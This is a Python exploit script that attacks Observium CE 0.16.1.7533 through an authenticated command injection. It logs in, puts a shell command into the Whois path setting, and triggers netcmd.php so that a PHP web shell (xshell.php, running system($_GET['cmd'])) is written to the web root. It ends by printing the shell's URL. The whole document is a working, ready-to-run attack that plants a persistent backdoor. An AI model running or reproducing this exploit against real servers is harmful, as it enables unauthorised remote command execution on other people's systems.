#!/usr/bin/python3
#-*- coding: utf-8 -*-
# Authenticated RCE
# Affects Observium CE 0.16.1.7533 (and maybe prior)

import requests, urllib.request
import sys, string
import os, argparse
from argparse import RawTextHelpFormatter

# Colors
class bco:
	WHT = '\033[37m'
	GRN = '\033[92m'
	ENC = '\033[0m'
	RED = '\033[91m'
	VIO = '\033[33m'

# Parse args
parser = argparse.ArgumentParser(description="""Observium CE 0.16.1.7533 Authenticated RCE
  eg: python3 poc.py -t http://127.0.0.1/observium/ -u bob -p 'letmein!1!!'
""", formatter_class=RawTextHelpFormatter)
parser.add_argument('-t', dest='TARGET_URI', help='URI to Observium web root', required=True)
parser.add_argument('-u', dest='USERNAME', help='Username', required=True)
parser.add_argument('-p', dest='PASSWORD', help='Password', required=True)
args = parser.parse_args()

# Start Main
def main():
	print(bco.GRN+"* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *"+bco.ENC)
	print("            ,--..._")
	print("          .'  .-.  '\"\"--.") 
	print("       _./'-. `-'     __/|")
	print("      F '\"--i_       '. \|========/'\"\\")
	print("      '-.     `\"--.__.''|J       /   /"+bco.RED+"SSSSSSSSSSSSSSSSSSSSSSssss.._"+bco.ENC)
	print("       _/  _     ()  |  !       {._ /"+bco.RED+"                             YS"+bco.ENC)
	print("      !__./ \        | /       /.-.\\"+bco.RED+"SSSss...__                 __.=P"+bco.ENC)
	print("     /       '\"\"--.__!'        :| |:"+bco.RED+"'\"\"\"\"\"^^SSSSSSSSSSSSSSSSSP^^\"\"  \\"+bco.ENC)
	print("    :'\"\"\"\"-----------..........!!_!!______                           \\ ") 
	print("    !                                    '\"\"\"\"\"\"\"\"\"--------....._____|")
	print("    '\"\"\"\"\"\"\"\"\"\"\"----------........._________                          |")
	print("                                            '\"\"\"\"\"\"\"------......______!")
	print("")
	print(bco.GRN+"* * * * * * * * Observium CE 0.16.1.7533 Authenticated RCE * * * * * * * * *"+bco.ENC)
	
	# Do functions
	aSession = login()
	rce(aSession)
	print(bco.GRN+"[+] Done"+bco.ENC)


######################
###  Login      ######
######################
def login():
	# Getting and loading the main observium page
	print(bco.GRN+"[+] Generating Request"+bco.ENC)
	if args.USERNAME is None or args.PASSWORD is None:
		print(bco.GRN+"[-] Username and Password required!"+bco.ENC)
		exit(1)
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
	}
	aSession = requests.Session() 
	loginCook = args.TARGET_URI
	res = aSession.get(loginCook)
	cookies = dict(res.cookies)
	loginUri = args.TARGET_URI


	# Loging in with provided creds
	print(bco.GRN+"[+] Attempting to Login"+bco.ENC)
	postData = { "username" : args.USERNAME, "password": args.PASSWORD, "submit" : "" }
	loginReq = aSession.post(loginUri, data = postData, allow_redirects=True, headers=headers, cookies=cookies)


	# Cheking if redirected back to main page/index.php
	incorrect = b'START logonform'
	if incorrect in loginReq.content:
		print("    [-] Login: Failed")
		exit(1)
	else:
		print("    [!] Login: Successful")
		return aSession


######################
###  Exploit    ######
######################
def rce(aSession):
	print(bco.GRN+"[+] Exploiting"+bco.ENC)
	
	# Payload to inject into Whois GUI path
	webShell="""
	/bin/echo '<pre><body style="background-color:#060224; color:#77c7a6;"><?php echo system($_GET["cmd"]); ?></pre>' > xshell.php; exit
	"""

	# Build the rce uri
	vulnURI = args.TARGET_URI + '/settings/section=paths/'
	vulnPostData = { "whois" : webShell, "varset_whois" : "", "whois_custom" : "1", "varset_dot" : "", "submit" : "save"}
	vulnRequest = aSession.post(vulnURI, data = vulnPostData, allow_redirects=True)

	# Check if the response or settings saved to contain our webshell
	yesGood = b'77c7a6'
	if yesGood in vulnRequest.content:
		print("    [+] Webshell writer injected into Whois path Successfully")
	else:
		print("    [-] Webshell injection Failed")
		exit(1)
	
	# Trigger the RCE aka in our case write a webshell to webroot
	print("    [+] Triggering Whois to write our Webshell to Observium webroot")
	triggerURI = args.TARGET_URI + 'netcmd.php?cmd=whois&query=127.0.0.1'
	triggerRequest = aSession.get(triggerURI)
	unauth = b'unauthenticated'
	if unauth is True or triggerRequest.status_code != 200:
		print("    [-] Trigger had an issue. Exiting...")
		exit(1)
	else:
		print("    [+] Trigger executed Successfully")
		print("    [!] Enjoy your new webshell!")
		print(bco.VIO+"        " + args.TARGET_URI + "xshell.php?cmd=netstat -antp"+bco.ENC)


if __name__ == "__main__":
	main()
